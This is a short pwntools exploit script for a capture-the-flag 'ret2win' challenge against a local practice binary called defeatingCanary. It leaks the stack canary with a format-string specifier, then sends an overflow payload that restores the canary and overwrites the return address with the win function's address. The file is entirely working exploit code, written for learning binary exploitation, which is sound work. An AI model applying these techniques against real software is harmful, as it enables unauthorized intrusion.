#This is a ret2win challenge
from pwn import *

context.terminal = ["tmux", "splitw", "-h"] #to open gdb vertically

elf = ELF("./defeatingCanary")

if args.GDB:
    p = process(elf.path)
    g = gdb.attach(p)
else:
    p = process(elf.path)

win = 0x004011a6

#1st interaction - leaking canary value
p.recvuntil(b"data:\n")
p.send(b"%15$p")
p.recvuntil(b"entered:\n")
canary = int(p.recv()[0:18], 16) #
log.success("Leaked Canary: " + hex(canary))


#n = p64(noByteCanary)
#2nd interaction - returning to win
offset = b"A"*40 #offset until canary

payload = offset
payload += p64(canary)
payload += b"BBBBBBBB" # 'B'*8 for bogus rbp value (we don't care about rbp)
payload += p64(win)

p.clean()
p.send(payload)

#To receive flag you can do this:
#res = p.recv()
#print(res)

#But this is nicer
p.interactive()
